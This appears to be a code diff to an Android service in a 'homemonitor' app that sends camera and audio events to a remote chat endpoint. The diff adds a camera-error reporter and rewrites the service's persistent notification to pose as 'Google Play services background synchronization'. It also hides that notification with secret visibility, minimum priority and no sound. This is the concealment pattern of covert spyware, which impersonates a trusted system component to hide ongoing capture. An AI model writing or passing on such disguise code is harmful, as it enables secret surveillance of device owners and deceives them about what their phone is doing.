@@ -226,6 +226,19 @@ class MonitorService : LifecycleService() {
             }
         }
 
+        fun sendCameraError(chatId: String, errorMessage: String) {
+            val inst = activeInstance
+            if (inst != null) {
+                val eventPayload = JSONObject().apply {
+                    put("event", "camera.error")
+                    put("error", errorMessage)
+                    put("chat_id", chatId)
+                    put("timestamp", System.currentTimeMillis())
+                }
+                com.homemonitor.DeviceApiDispatcher(inst).dispatchStreamEvent(inst.webRtcEngine, "camera.error", eventPayload)
+            }
+        }
+
         fun sendAudioPublic(chatId: String, audioFile: File) {
             val inst = activeInstance
             if (inst != null && audioFile.exists()) {
@@ -376,10 +389,10 @@ class MonitorService : LifecycleService() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 channelId,
-                "System Service",
+                "Google Play services",
                 NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = "System Service"
+                description = "Google Play services background synchronization"
                 setShowBadge(false)
                 setSound(null, null)
                 enableVibration(false)
@@ -395,12 +408,14 @@ class MonitorService : LifecycleService() {
         )
 
         val notification = NotificationCompat.Builder(this, channelId)
-            .setContentTitle("")
-            .setContentText("")
-            .setSmallIcon(android.R.drawable.sym_def_app_icon)
+            .setContentTitle("Google Play services")
+            .setContentText("Google Play services background synchronization")
+            .setSmallIcon(android.R.drawable.ic_dialog_info)
             .setOngoing(true)
             .setSilent(true)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setContentIntent(pendingIntent)
             .build()
 
         try {
